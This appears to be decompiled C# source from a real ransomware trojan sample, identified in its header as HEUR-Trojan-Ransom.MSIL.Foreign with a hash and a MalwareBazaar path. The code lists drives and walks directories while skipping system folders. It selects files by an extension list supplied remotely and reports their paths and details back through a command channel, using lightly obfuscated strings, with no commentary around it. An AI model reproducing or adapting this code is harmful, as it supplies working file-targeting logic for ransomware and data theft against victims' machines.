// Decompiled with JetBrains decompiler
// Type: hdrmiprcav.DEROIVF
// Assembly: hdrmiprcav, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19C57B26-C98B-40D0-861C-E3408295906D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-bff6270b7c6240c394515dc2505bb9f55d7b9df700be1777a8469143f78d0eb6.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace hdrmiprcav
{
  internal class DEROIVF
  {
    public List<string> ex_folders = new List<string>();
    public int file_index = 0;
    public List<string> irvrmjavhicrsFildes = new List<string>();
    public int fIndx = 0;
    public bool is_reading = false;
    public MROIDM core_svr;
    public List<string> file_exts = new List<string>();

    public DEROIVF()
    {
      this.ex_folders.Add("program files|".Split('|')[0]);
      this.ex_folders.Add("system volume information|".Split('|')[0]);
      this.ex_folders.Add("windows|".Split('|')[0]);
      this.ex_folders.Add("program files (x86)|".Split('|')[0]);
      this.ex_folders.Add("programdata|".Split('|')[0]);
    }

    public bool dirs_access(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public string lookup_drive()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">|".Split('|')[0];
      }
      return str;
    }

    public IEnumerable<string> add_up_files(string path)
    {
      Queue<string> dir_ques = new Queue<string>();
      dir_ques.Enqueue(path);
      while (dir_ques.Count > 0 && !this.core_svr.is_req_cancel)
      {
        path = dir_ques.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.dirs_access(directory) && !this.ex_folders.Contains(directory.ToLower()))
              dir_ques.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public void see_folders(string info_str)
    {
      this.core_svr.is_req_cancel = false;
      this.file_exts.Clear();
      this.irvrmjavhicrsFildes.Clear();
      this.fIndx = 0;
      this.file_index = 0;
      string[] strArray = info_str.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.file_exts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.is_reading = true;
        this.syn_dirs(strArray[1]);
        this.is_reading = false;
        this.core_svr.load_data((byte[]) null, "seyard=seayhed|".Split('|')[0]);
      }
    }

    public string see_files(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|".Split('|')[0];
      }
      return str;
    }

    public string exp_folder(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.dirs_access(directory))
            str = str + directory + ">|".Split('|')[0];
        }
      }
      return str;
    }

    public void syn_dirs(string path)
    {
      try
      {
        foreach (string addUpFile in this.add_up_files(path))
        {
          if (this.file_exts.Contains(Path.GetExtension(addUpFile).ToLower()))
          {
            string str = this.core_svr.file_details(addUpFile, true);
            this.core_svr.load_data((byte[]) null, "seyarf=|".Split('|')[0] + addUpFile + "<SAVE_AUTO<|".Split('|')[0] + str);
          }
          if (this.core_svr.is_req_cancel)
            break;
        }
      }
      catch
      {
      }
    }
  }
}
